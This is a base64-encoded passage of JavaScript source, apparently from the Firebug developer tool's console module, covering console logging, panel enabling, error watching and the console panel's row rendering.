JsZU1vZHVsZSwgRmlyZWJ1Zy5Db25zb2xlQmFzZSk7DQp2YXIgQWN0aXZhYmxlQ29uc29sZSA9IGV4dGVuZChGaXJlYnVnLkNvbnNvbGVCYXNlLCANCnsNCiAgICBpc0Fsd2F5c0VuYWJsZWQ6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCn0pOw0KDQpGaXJlYnVnLkNvbnNvbGUgPSBGaXJlYnVnLkNvbnNvbGUgPSBleHRlbmQoQWN0aXZhYmxlQ29uc29sZSwNCi8vRmlyZWJ1Zy5Db25zb2xlID0gZXh0ZW5kKEFjdGl2YWJsZUNvbnNvbGUsDQp7DQogICAgZGlzcGF0Y2hOYW1lOiAiY29uc29sZSIsDQogICAgDQogICAgZXJyb3I6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2dGb3JtYXR0ZWQoYXJndW1lbnRzLCBGaXJlYnVnLmJyb3dzZXIsICJlcnJvciIpOw0KICAgIH0sDQogICAgDQogICAgZmx1c2g6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGRpc3BhdGNoKHRoaXMuZmJMaXN0ZW5lcnMsImZsdXNoIixbXSk7DQogICAgICAgIA0KICAgICAgICBmb3IgKHZhciBpPTAsIGxlbmd0aD1jb25zb2xlUXVldWUubGVuZ3RoOyBpPGxlbmd0aDsgaSsrKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgYXJncyA9IGNvbnNvbGVRdWV1ZVtpXTsNCiAgICAgICAgICAgIHRoaXMubG9nUm93LmFwcGx5KHRoaXMsIGFyZ3MpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIE1vZHVsZQ0KDQogICAgc2hvd1BhbmVsOiBmdW5jdGlvbihicm93c2VyLCBwYW5lbCkNCiAgICB7DQogICAgfSwNCg0KICAgIGdldEZpcmVidWdDb25zb2xlRWxlbWVudDogZnVuY3Rpb24oY29udGV4dCwgd2luKQ0KICAgIHsNCiAgICAgICAgdmFyIGVsZW1lbnQgPSB3aW4uZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIl9maXJlYnVnQ29uc29sZSIpOw0KICAgICAgICBpZiAoIWVsZW1lbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJnZXRGaXJlYnVnQ29uc29sZUVsZW1lbnQgZm9yY2luZyBlbGVtZW50Iik7DQogICAgICAgICAgICB2YXIgZWxlbWVudEZvcmNlciA9ICIoZnVuY3Rpb24oKXt2YXIgcj1udWxsOyB0cnkgeyByID0gd2luZG93Ll9nZXRGaXJlYnVnQ29uc29sZUVsZW1lbnQoKTt9Y2F0Y2goZXhjKXtyPWV4Yzt9IHJldHVybiByO30pKCk7IjsgIC8vIHdlIGNvdWxkIGp1c3QgYWRkIHRoZSBlbGVtZW50cyBoZXJlDQoNCiAgICAgICAgICAgIGlmIChjb250ZXh0LnN0b3BwZWQpDQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmluamVjdG9yLmV2YWx1YXRlQ29uc29sZVNjcmlwdChjb250ZXh0KTsgIC8vIHRvZG8gZXZhbHVhdGUgY29uc29sZUZvcmNlciBvbiBzdGFjaw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHZhciByID0gRmlyZWJ1Zy5Db21tYW5kTGluZS5ldmFsdWF0ZUluV2ViUGFnZShlbGVtZW50Rm9yY2VyLCBjb250ZXh0LCB3aW4pOw0KDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZ2V0RmlyZWJ1Z0NvbnNvbGVFbGVtZW50IGZvcmNpbmcgZWxlbWVudCByZXN1bHQgIityLCByKTsNCg0KICAgICAgICAgICAgdmFyIGVsZW1lbnQgPSB3aW4uZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIl9maXJlYnVnQ29uc29sZSIpOw0KICAgICAgICAgICAgaWYgKCFlbGVtZW50KSAvLyBlbGVtZW50Rm9yY2UgZmFpbHMNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKSBGQlRyYWNlLnN5c291dCgiY29uc29sZS5nZXRGaXJlYnVnQ29uc29sZUVsZW1lbnQ6IG5vIF9maXJlYnVnQ29uc29sZSBpbiB3aW46Iiwgd2luKTsNCiAgICAgICAgICAgICAgICBGaXJlYnVnLkNvbnNvbGUubG9nRm9ybWF0dGVkKFsiRmlyZWJ1ZyBjYW5ub3QgZmluZCBfZmlyZWJ1Z0NvbnNvbGUgZWxlbWVudCIsIHIsIHdpbl0sIGNvbnRleHQsICJlcnJvciIsIHRydWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIGVsZW1lbnQ7DQogICAgfSwNCg0KICAgIGlzUmVhZHlFbHNlUHJlcGFyaW5nOiBmdW5jdGlvbihjb250ZXh0LCB3aW4pIC8vIHRoaXMgaXMgdGhlIG9ubHkgY29kZSB0aGF0IHNob3VsZCBjYWxsIGluamVjdG9yLmF0dGFjaElmTmVlZGVkDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlLmlzUmVhZHlFbHNlUHJlcGFyaW5nLCB3aW4gaXMgIiArDQogICAgICAgICAgICAgICAgKHdpbj8iYW4gYXJndW1lbnQ6ICI6Im51bGwsIGNvbnRleHQud2luZG93OiAiKSArDQogICAgICAgICAgICAgICAgKHdpbj93aW4ubG9jYXRpb246Y29udGV4dC53aW5kb3cubG9jYXRpb24pLCAod2luP3dpbjpjb250ZXh0LndpbmRvdykpOw0KDQogICAgICAgIGlmICh3aW4pDQogICAgICAgICAgICByZXR1cm4gdGhpcy5pbmplY3Rvci5hdHRhY2hJZk5lZWRlZChjb250ZXh0LCB3aW4pOw0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBhdHRhY2hlZCA9IHRydWU7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGNvbnRleHQud2luZG93cy5sZW5ndGg7IGkrKykNCiAgICAgICAgICAgICAgICBhdHRhY2hlZCA9IGF0dGFjaGVkICYmIHRoaXMuaW5qZWN0b3IuYXR0YWNoSWZOZWVkZWQoY29udGV4dCwgY29udGV4dC53aW5kb3dzW2ldKTsNCiAgICAgICAgICAgIC8vIGFscmVhZHkgaW4gdGhlIGxpc3QgYWJvdmUgYXR0YWNoZWQgPSBhdHRhY2hlZCAmJiB0aGlzLmluamVjdG9yLmF0dGFjaElmTmVlZGVkKGNvbnRleHQsIGNvbnRleHQud2luZG93KTsNCiAgICAgICAgICAgIGlmIChjb250ZXh0LndpbmRvd3MuaW5kZXhPZihjb250ZXh0LndpbmRvdykgPT0gLTEpDQogICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImlzUmVhZHlFbHNlUHJlcGFyaW5nICoqKioqKioqKioqKioqKioqIGNvbnRleHQud2luZG93IG5vdCBpbiBjb250ZXh0LndpbmRvd3MiKTsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJjb25zb2xlLmlzUmVhZHlFbHNlUHJlcGFyaW5nIGF0dGFjaGVkIHRvICIrY29udGV4dC53aW5kb3dzLmxlbmd0aCsiIGFuZCByZXR1cm5zICIrYXR0YWNoZWQpOw0KICAgICAgICAgICAgcmV0dXJuIGF0dGFjaGVkOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIEFjdGl2YWJsZU1vZHVsZQ0KDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5wYW5lbE5hbWUgPSAiY29uc29sZSI7DQoNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybw0KICAgICAgICAvL0ZpcmVidWcuQWN0aXZhYmxlTW9kdWxlLmluaXRpYWxpemUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgLy9GaXJlYnVnLkRlYnVnZ2VyLmFkZExpc3RlbmVyKHRoaXMpOw0KICAgIH0sDQoNCiAgICBlbmFibGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChGaXJlYnVnLkNvbnNvbGUuaXNBbHdheXNFbmFibGVkKCkpDQogICAgICAgICAgICB0aGlzLndhdGNoRm9yRXJyb3JzKCk7DQogICAgfSwNCg0KICAgIGRpc2FibGU6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChGaXJlYnVnLkNvbnNvbGUuaXNBbHdheXNFbmFibGVkKCkpDQogICAgICAgICAgICB0aGlzLnVud2F0Y2hGb3JFcnJvcnMoKTsNCiAgICB9LA0KDQogICAgaW5pdENvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQsIHBlcnNpc3RlZFN0YXRlKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5BY3RpdmFibGVNb2R1bGUuaW5pdENvbnRleHQuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICAgICAgY29udGV4dC5jb25zb2xlUmVsb2FkV2FybmluZyA9IHRydWU7ICAvLyBtYXJrIGFzIG5lZWQgdG8gd2Fybi4NCiAgICB9LA0KDQogICAgbG9hZGVkQ29udGV4dDogZnVuY3Rpb24oY29udGV4dCkNCiAgICB7DQogICAgICAgIGZvciAodmFyIHVybCBpbiBjb250ZXh0LnNvdXJjZUZpbGVNYXApDQogICAgICAgICAgICByZXR1cm47ICAvLyBpZiB0aGVyZSBhcmUgYW55IHNvdXJjZUZpbGVzLCB0aGVuIGRvIG5vdGhpbmcNCg0KICAgICAgICAvLyBlbHNlIHdlIHNhdyBubyBKUywgc28gdGhlIHJlbG9hZCB3YXJuaW5nIGl0IG5vdCBuZWVkZWQuDQogICAgICAgIHRoaXMuY2xlYXJSZWxvYWRXYXJuaW5nKGNvbnRleHQpOw0KICAgIH0sDQoNCiAgICBjbGVhclJlbG9hZFdhcm5pbmc6IGZ1bmN0aW9uKGNvbnRleHQpIC8vIHJlbW92ZSB0aGUgd2FybmluZyBhYm91dCByZWxvYWRpbmcuDQogICAgew0KICAgICAgICAgaWYgKGNvbnRleHQuY29uc29sZVJlbG9hZFdhcm5pbmcpDQogICAgICAgICB7DQogICAgICAgICAgICAgdmFyIHBhbmVsID0gY29udGV4dC5nZXRQYW5lbCh0aGlzLnBhbmVsTmFtZSk7DQogICAgICAgICAgICAgcGFuZWwuY2xlYXJSZWxvYWRXYXJuaW5nKCk7DQogICAgICAgICAgICAgZGVsZXRlIGNvbnRleHQuY29uc29sZVJlbG9hZFdhcm5pbmc7DQogICAgICAgICB9DQogICAgfSwNCg0KICAgIHRvZ2dsZVBlcnNpc3Q6IGZ1bmN0aW9uKGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgcGFuZWwgPSBjb250ZXh0LmdldFBhbmVsKHRoaXMucGFuZWxOYW1lKTsNCiAgICAgICAgcGFuZWwucGVyc2lzdENvbnRlbnQgPSBwYW5lbC5wZXJzaXN0Q29udGVudCA/IGZhbHNlIDogdHJ1ZTsNCiAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuc2V0R2xvYmFsQXR0cmlidXRlKCJjbWRfdG9nZ2xlUGVyc2lzdENvbnNvbGUiLCAiY2hlY2tlZCIsIHBhbmVsLnBlcnNpc3RDb250ZW50KTsNCiAgICB9LA0KDQogICAgc2hvd0NvbnRleHQ6IGZ1bmN0aW9uKGJyb3dzZXIsIGNvbnRleHQpDQogICAgew0KICAgICAgICBGaXJlYnVnLmNocm9tZS5zZXRHbG9iYWxBdHRyaWJ1dGUoImNtZF9jbGVhckNvbnNvbGUiLCAiZGlzYWJsZWQiLCAhY29udGV4dCk7DQoNCiAgICAgICAgRmlyZWJ1Zy5BY3RpdmFibGVNb2R1bGUuc2hvd0NvbnRleHQuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICB9LA0KDQogICAgZGVzdHJveUNvbnRleHQ6IGZ1bmN0aW9uKGNvbnRleHQsIHBlcnNpc3RlZFN0YXRlKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmluamVjdG9yLmRldGFjaENvbnNvbGUoY29udGV4dCwgY29udGV4dC53aW5kb3cpOyAgLy8gVE9ETyBpdGVyYXRlIHdpbmRvd3M/DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIG9uUGFuZWxFbmFibGU6IGZ1bmN0aW9uKHBhbmVsTmFtZSkNCiAgICB7DQogICAgICAgIGlmIChwYW5lbE5hbWUgIT0gdGhpcy5wYW5lbE5hbWUpICAvLyB3ZSBkb24ndCBjYXJlIGFib3V0IG90aGVyIHBhbmVscw0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNvbnNvbGUub25QYW5lbEVuYWJsZSoqKioqKioqKioqKioqIik7DQoNCiAgICAgICAgdGhpcy53YXRjaEZvckVycm9ycygpOw0KICAgICAgICBGaXJlYnVnLkRlYnVnZ2VyLmFkZERlcGVuZGVudE1vZHVsZSh0aGlzKTsgLy8gd2UgaW5qZWN0IHRoZSBjb25zb2xlIGR1cmluZyBKUyBjb21waWxlcyBzbyB3ZSBuZWVkIGpzZA0KICAgIH0sDQoNCiAgICBvblBhbmVsRGlzYWJsZTogZnVuY3Rpb24ocGFuZWxOYW1lKQ0KICAgIHsNCiAgICAgICAgaWYgKHBhbmVsTmFtZSAhPSB0aGlzLnBhbmVsTmFtZSkgIC8vIHdlIGRvbid0IGNhcmUgYWJvdXQgb3RoZXIgcGFuZWxzDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5vblBhbmVsRGlzYWJsZSoqKioqKioqKioqKioqIik7DQoNCiAgICAgICAgRmlyZWJ1Zy5EZWJ1Z2dlci5yZW1vdmVEZXBlbmRlbnRNb2R1bGUodGhpcyk7IC8vIHdlIGluamVjdCB0aGUgY29uc29sZSBkdXJpbmcgSlMgY29tcGlsZXMgc28gd2UgbmVlZCBqc2QNCiAgICAgICAgdGhpcy51bndhdGNoRm9yRXJyb3JzKCk7DQoNCiAgICAgICAgLy8gTWFrZSBzdXJlIHBvc3NpYmxlIGVycm9ycyBjb21pbmcgZnJvbSB0aGUgcGFnZSBhbmQgZGlzcGxheWVkIGluIHRoZSBGaXJlZm94DQogICAgICAgIC8vIHN0YXR1cyBiYXIgYXJlIHJlbW92ZWQuDQogICAgICAgIHRoaXMuY2xlYXIoKTsNCiAgICB9LA0KDQogICAgb25TdXNwZW5kRmlyZWJ1ZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NPTlNPTEUpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiY29uc29sZS5vblN1c3BlbmRGaXJlYnVnXG4iKTsNCiAgICAgICAgaWYgKEZpcmVidWcuQ29uc29sZS5pc0Fsd2F5c0VuYWJsZWQoKSkNCiAgICAgICAgICAgIHRoaXMudW53YXRjaEZvckVycm9ycygpOw0KICAgIH0sDQoNCiAgICBvblJlc3VtZUZpcmVidWc6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImNvbnNvbGUub25SZXN1bWVGaXJlYnVnXG4iKTsNCiAgICAgICAgaWYgKEZpcmVidWcuQ29uc29sZS5pc0Fsd2F5c0VuYWJsZWQoKSkNCiAgICAgICAgICAgIHRoaXMud2F0Y2hGb3JFcnJvcnMoKTsNCiAgICB9LA0KDQogICAgd2F0Y2hGb3JFcnJvcnM6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIEZpcmVidWcuRXJyb3JzLmNoZWNrRW5hYmxlZCgpOw0KICAgICAgICAkKCdmYlN0YXR1c0ljb24nKS5zZXRBdHRyaWJ1dGUoImNvbnNvbGUiLCAib24iKTsNCiAgICB9LA0KDQogICAgdW53YXRjaEZvckVycm9yczogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgRmlyZWJ1Zy5FcnJvcnMuY2hlY2tFbmFibGVkKCk7DQogICAgICAgICQoJ2ZiU3RhdHVzSWNvbicpLnJlbW92ZUF0dHJpYnV0ZSgiY29uc29sZSIpOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gRmlyZWJ1Zy5EZWJ1Z2dlciBsaXN0ZW5lcg0KDQogICAgb25Nb25pdG9yU2NyaXB0OiBmdW5jdGlvbihjb250ZXh0LCBmcmFtZSkNCiAgICB7DQogICAgICAgIEZpcmVidWcuQ29uc29sZS5sb2coZnJhbWUsIGNvbnRleHQpOw0KICAgIH0sDQoNCiAgICBvbkZ1bmN0aW9uQ2FsbDogZnVuY3Rpb24oY29udGV4dCwgZnJhbWUsIGRlcHRoLCBjYWxsaW5nKQ0KICAgIHsNCiAgICAgICAgaWYgKGNhbGxpbmcpDQogICAgICAgICAgICBGaXJlYnVnLkNvbnNvbGUub3Blbkdyb3VwKFtmcmFtZSwgImRlcHRoOiIrZGVwdGhdLCBjb250ZXh0KTsNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmNsb3NlR3JvdXAoY29udGV4dCk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGxvZ1JvdzogZnVuY3Rpb24oYXBwZW5kZXIsIG9iamVjdHMsIGNvbnRleHQsIGNsYXNzTmFtZSwgcmVwLCBzb3VyY2VMaW5rLCBub1Rocm90dGxlLCBub1JvdykNCiAgICB7DQogICAgICAgIGlmICghY29udGV4dCkNCiAgICAgICAgICAgIGNvbnRleHQgPSBGaXJlYnVnQ29udGV4dDsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfV0lORE9XUyAmJiAhY29udGV4dCkgRkJUcmFjZS5zeXNvdXQoIkNvbnNvbGUubG9nUm93OiBubyBjb250ZXh0IFxuIik7DQoNCiAgICAgICAgaWYgKHRoaXMuaXNBbHdheXNFbmFibGVkKCkpDQogICAgICAgICAgICByZXR1cm4gRmlyZWJ1Zy5Db25zb2xlQmFzZS5sb2dSb3cuYXBwbHkodGhpcywgYXJndW1lbnRzKTsNCiAgICB9DQp9KTsNCg0KRmlyZWJ1Zy5Db25zb2xlTGlzdGVuZXIgPQ0Kew0KICAgIGxvZzogZnVuY3Rpb24oY29udGV4dCwgb2JqZWN0LCBjbGFzc05hbWUsIHNvdXJjZUxpbmspDQogICAgew0KICAgIH0sDQoNCiAgICBsb2dGb3JtYXR0ZWQ6IGZ1bmN0aW9uKGNvbnRleHQsIG9iamVjdHMsIGNsYXNzTmFtZSwgc291cmNlTGluaykNCiAgICB7DQogICAgfQ0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuQ29uc29sZVBhbmVsID0gZnVuY3Rpb24gKCkge30gLy8gWFhqamIgYXR0YWNoIEZpcmVidWcgc28gdGhpcyBwYW5lbCBjYW4gYmUgZXh0ZW5kZWQuDQoNCi8vVE9ETzogeHh4cGVkcm8NCi8vRmlyZWJ1Zy5Db25zb2xlUGFuZWwucHJvdG90eXBlID0gZXh0ZW5kKEZpcmVidWcuQWN0aXZhYmxlUGFuZWwsDQpGaXJlYnVnLkNvbnNvbGVQYW5lbC5wcm90b3R5cGUgPSBleHRlbmQoRmlyZWJ1Zy5QYW5lbCwNCnsNCiAgICB3YXNTY3JvbGxlZFRvQm90dG9tOiBmYWxzZSwNCiAgICBtZXNzYWdlQ291bnQ6IDAsDQogICAgbGFzdExvZ1RpbWU6IDAsDQogICAgZ3JvdXBzOiBudWxsLA0KICAgIGxpbWl0OiBudWxsLA0KDQogICAgYXBwZW5kOiBmdW5jdGlvbihhcHBlbmRlciwgb2JqZWN0cywgY2xhc3NOYW1lLCByZXAsIHNvdXJjZUxpbmssIG5vUm93KQ0KICAgIHsNCiAgICAgICAgdmFyIGNvbnRhaW5lciA9IHRoaXMuZ2V0VG9wQ29udGFpbmVyKCk7DQoNCiAgICAgICAgaWYgKG5vUm93KQ0KICAgICAgICB7DQogICAgICAgICAgICBhcHBlbmRlci5hcHBseSh0aGlzLCBbb2JqZWN0c10pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgLy8geHh4SG9uemE6IERvbid0IHVwZGF0ZSB0aGUgdGhpcy53YXNTY3JvbGxlZFRvQm90dG9tIGZsYWcgbm93Lg0KICAgICAgICAgICAgLy8gQXQgdGhlIGJlZ2lubmluZyAod2hlbiB0aGUgZmlyc3QgbG9nIGlzIGNyZWF0ZWQpIHRoZSBpc1Njcm9sbGVkVG9Cb3R0b20NCiAgICAgICAgICAgIC8vIGFsd2F5cyByZXR1cm5zIHRydWUuDQogICAgICAgICAgICAvL2lmICh0aGlzLnBhbmVsTm9kZS5vZmZzZXRIZWlnaHQpDQogICAgICAgICAgICAvLyAgICB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20gPSBpc1Njcm9sbGVkVG9Cb3R0b20odGhpcy5wYW5lbE5vZGUpOw0KDQogICAgICAgICAgICB2YXIgcm93ID0gdGhpcy5jcmVhdGVSb3coImxvZ1JvdyIsIGNsYXNzTmFtZSk7DQogICAgICAgICAgICBhcHBlbmRlci5hcHBseSh0aGlzLCBbb2JqZWN0cywgcm93LCByZXBdKTsNCg0KICAgICAgICAgICAgaWYgKHNvdXJjZUxpbmspDQogICAgICAgICAgICAgICAgRmlyZWJ1Z1JlcHMuU291cmNlTGluay50YWcuYXBwZW5kKHtvYmplY3Q6IHNvdXJjZUxpbmt9LCByb3cpOw0KDQogICAgICAgICAgICBjb250YWluZXIuYXBwZW5kQ2hpbGQocm93KTsNCg0KICAgICAgICAgICAgdGhpcy5maWx0ZXJMb2dSb3cocm93LCB0aGlzLndhc1Njcm9sbGVkVG9Cb3R0b20pOw0KDQogICAgICAgICAgICBpZiAodGhpcy53YXNTY3JvbGxlZFRvQm90dG9tKQ0KICAgICAgICAgICAgICAgIHNjcm9sbFRvQm90dG9tKHRoaXMucGFuZWxOb2RlKTsNCg0KICAgICAgICAgICAgcmV0dXJuIHJvdzsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBjbGVhcjogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMucGFuZWxOb2RlKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiQ29uc29sZVBhbmVsLmNsZWFyIik7DQogICAgICAgICAgICBjbGVhck5vZGUodGhpcy5wYW5lbE5vZGUpOw0KICAgICAgICAgICAgdGhpcy5pbnNlcnRMb2dMaW1pdCh0aGlzLmNvbnRleHQpOw0KICAgICAgICB9DQogICAgfSwNCg0KICAgIGluc2VydExvZ0xpbWl0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLyBDcmVhdGUgbGltaXQgcm93LiBUaGlzIHJvdyBpcyB0aGUgZmlyc3QgaW4gdGhlIGxpc3Qgb2YgZW50cmllcw0KICAgICAgICAvLyBhbmQgaW5pdGlhbGx5IGhpZGRlbi4gSXQncyBkaXNwbGF5ZWQgYXMgc29vbiBhcyB0aGUgbnVtYmVyIG9mDQogICAgICAgIC8vIGVudHJpZXMgcmVhY2hlcyB0aGUgbGltaXQuDQogICAgICAgIHZhciByb3cgPSB0aGlzLmNyZWF0ZVJvdygibGltaXRSb3ciKTsNCg0KICAgICAgICB2YXIgbGltaXRJbmZvID0gew0KICAgICAgICAgICAgdG90YWxDb3VudDogMCwNCiAgICAgICAgICAgIGxpbWl0UHJlZnNUaXRsZTogJFNUUkYoIkxpbWl0UHJlZnNUaXRsZSIsIFtGaXJlYnVnLnByZWZEb21haW4rIi5jb25zb2xlLmxvZ0xpbWl0Il0pDQogICAgICAgIH07DQoNCiAgICAgICAgLy9UT0RPOiB4eHhwZWRybyBjb25zb2xlIG5ldCBsaW1pdCE/DQogICAgICAgIHJldHVybjsNCiAgICAgICAgdmFyIG5ldExpbWl0UmVwID0gRmlyZWJ1Zy5OZXRNb25pdG9yLk5ldExpbWl0Ow0KICAgICAgICB2YXIgbm9kZXMgPSBuZXRMaW1pdFJlcC5jcmVhdGVUYWJsZShyb3csIGxpbWl0SW5mbyk7DQoNCiAgICAgICAgdGhpcy5saW1pdCA9IG5vZGVzWzFdOw0KDQogICAgICAgIHZhciBjb250YWluZXIgPSB0aGlzLnBhbmVsTm9kZTsNCiAgICAgICAgY29udGFpbmVyLmluc2VydEJlZm9yZShub2Rlc1swXSwgY29udGFpbmVyLmZpcnN0Q2hpbGQpOw0KICAgIH0sDQoNCiAgICBpbnNlcnRSZWxvYWRXYXJuaW5nOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICAvLyBwdXQgdGhlIG1lc3NhZ2UgaW4sIHdlIHdpbGwgY2xlYXIgaWYgdGhlIHdpbmRvdyBjb25zb2xlIGlzIGluamVjdGVkLg0KICAgICAgICB0aGlzLndhcm5pbmdSb3cgPSB0aGlzLmFwcGVuZChhcHBlbmRPYmplY3QsICRTVFIoIm1lc3NhZ2UuUmVsb2FkIHRvIGFjdGl2YXRlIHdpbmRvdyBjb25zb2xlIiksICJpbmZvIik7DQogICAgfSwNCg0KICAgIGNsZWFyUmVsb2FkV2FybmluZzogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgaWYgKHRoaXMud2FybmluZ1JvdykNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy53YXJuaW5nUm93LnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQodGhpcy53YXJuaW5nUm93KTsNCiAgICAgICAgICAgIGRlbGV0ZSB0aGlzLndhcm5pbmdSb3c7DQogICAgICAgIH0NCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgYXBwZW5kT2JqZWN0OiBmdW5jdGlvbihvYmplY3QsIHJvdywgcmVwKQ0KICAgIHsNCiAgICAgICAgaWYgKCFyZXApDQogICAgICAgICAgICByZXAgPSBGaXJlYnVnLmdldFJlcChvYmplY3QpOw0KICAgICAgICByZXR1cm4gcmVwLnRhZy5hcHBlbmQoe29iamVjdDogb2JqZWN0fSwgcm93KTsNCiAgICB9LA0KDQogICAgYXBwZW5kRm9ybWF0dGVkOiBmdW5jdGlvbihvYmplY3RzLCByb3csIHJlcCkNCiAgICB7DQogICAgICAgIGlmICghb2JqZWN0cyB8fCAhb2JqZWN0cy5sZW5ndGgpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgZnVuY3Rpb24gbG9nVGV4dCh0ZXh0LCByb3cpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBub2RlID0gcm93Lm93bmVyRG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUodGV4dCk7DQogICAgICAgICAgICByb3cuYXBwZW5kQ2hpbGQobm9kZSk7DQogICAgICAgIH0NCg0KICAgICAgICB2YXIgZm9ybWF0ID0gb2JqZWN0c1swXTsNCiAgICAgICAgdmFyIG9iakluZGV4ID0gMDsNCg0KICAgICAgICBpZiAodHlwZW9mKGZvcm1hdCkgIT0gInN0cmluZyIpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvcm1hdCA9ICIiOw0KICAgICAgICAgICAgb2JqSW5kZXggPSAtMTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlICAvLyBhIHN0cmluZw0KICAgICAgICB7DQogICAgICAgICAgICBpZiAob2JqZWN0cy5sZW5ndGggPT09IDEpIC8vIHRoZW4gd2UgaGF2ZSBvbmx5IGEgc3RyaW5nLi4uD